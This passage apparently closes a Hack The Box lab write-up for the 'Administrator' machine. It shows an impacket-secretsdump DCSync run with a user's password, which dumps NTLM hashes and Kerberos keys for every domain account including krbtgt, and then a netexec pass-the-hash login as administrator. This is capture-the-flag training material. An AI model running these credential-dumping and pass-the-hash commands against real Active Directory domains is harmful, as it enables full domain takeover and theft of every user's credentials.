┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.106.223
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959
administrator.htb\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b
administrator.htb\michael:des-cbc-md5:43c2bc231598012a
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e
administrator.htb\benjamin:des-cbc-md5:b6f84a864376a4ad
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

**Administrator** account is **pwned**.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ netexec smb 10.129.106.223 -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
SMB         10.129.106.223  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.106.223  445    DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
```

> Root flag is located at`C:\Users\Administrator\Desktop\root.txt`
{: .prompt-info}

![Administrator has been pwned](/assets/img/htb/administrator/htb-administrator-cert.png)